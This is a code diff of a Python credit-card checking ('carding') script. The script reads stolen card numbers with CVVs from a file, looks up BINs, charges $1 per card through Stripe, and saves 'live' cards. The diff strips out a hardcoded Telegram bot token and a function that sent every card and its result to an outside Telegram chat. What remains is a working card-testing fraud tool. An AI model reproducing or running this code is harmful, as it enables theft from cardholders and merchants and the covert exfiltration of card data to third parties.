@@ -10,10 +10,6 @@ CARD_PATTERN = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})"
 CC_FILE = 'cc.txt'
 APPROVE_FILE = 'approve.txt'
 
-# Telegram Bot Info
-BOT_TOKEN = '7386696229:AAE4z8mK-AiFThXC5VtHs1ZRp59vI_tHmRU'
-CHAT_ID = '-1002477049031'
-
 async def get_bin_info(bin_number):
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
     connector = aiohttp.TCPConnector(ssl=False)
@@ -38,21 +34,6 @@ async def get_bin_info(bin_number):
 def save_approved_card(card_info, message):
     with open(APPROVE_FILE, 'a') as f:
         f.write(f"{card_info} - {message}\n")
-
-def send_to_telegram(message):
-    """Sends the message to the specified Telegram chat."""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        'chat_id': CHAT_ID,
-        'text': message,
-        'parse_mode': 'Markdown'
-    }
-    try:
-        response = requests.post(url, data=payload)
-        if response.status_code != 200:
-            print(f"Failed to send message to Telegram: {response.text}")
-    except requests.RequestException as e:
-        print(f"Error sending message to Telegram: {str(e)}")
 
 def process_card(card_info, sk, pk):
     split = card_info.split("|")
@@ -87,17 +68,13 @@ def process_card(card_info, sk, pk):
         except json.JSONDecodeError:
             error_message = "Unknown error"
 
-        response_text = f"Declined ❌ for `{card_info}`: {error_message}"
-        send_to_telegram(response_text)  # Send to Telegram
-        return response_text
+        return f"Declined ❌ for `{card_info}`: {error_message}"
 
     token_data = response.json()
     token_id = token_data.get("id", "")
 
     if not token_id:
-        response_text = f"❌ Token creation failed for `{card_info}`"
-        send_to_telegram(response_text)  # Send to Telegram
-        return response_text
+        return f"❌ Token creation failed for `{card_info}`"
 
     charge_data = {
         "amount": AMOUNT * 100,
@@ -119,9 +96,7 @@ def process_card(card_info, sk, pk):
             },
         )
     except requests.RequestException as e:
-        response_text = f"❌ Charge error for `{cc}`: {str(e)}"
-        send_to_telegram(response_text)  # Send to Telegram
-        return response_text
+        return f"❌ Charge error for `{cc}`: {str(e)}"
     
     charges = response.text
 
@@ -133,7 +108,6 @@ def process_card(card_info, sk, pk):
         charge_error = "Unknown error (Invalid JSON response)"
         charge_message = "No message available"
 
-    # Determine the response status and message
     if '"status": "succeeded"' in charges:
         status = "Approved ✅"
         resp = "Charged 1$🔥"
@@ -149,23 +123,11 @@ def process_card(card_info, sk, pk):
         status = "LIVE ✅"
         resp = "Insufficient funds 💰"
         save_approved_card(card_info, resp)
-    elif "fraudulent" in charges:
-        status = "Declined ❌"
-        resp = "Fraudulent"
-    elif "do_not_honor" in charges:
-        status = "Declined ❌"
-        resp = "Do Not Honor"
-    elif "authentication_required" in charges or "card_error_authentication_required" in charges:
-        status = "LIVE ✅"
-        resp = "3D Secured"
     else:
         status = charge_error
         resp = charge_message
 
-    # Construct and send the response
-    response_text = f"{status}\n\n𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}"
-    send_to_telegram(response_text)  # Send all responses to Telegram
-    return response_text
+    return f"{status}\n\n𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}"
 
 def main():
     # Replace these with actual Stripe keys
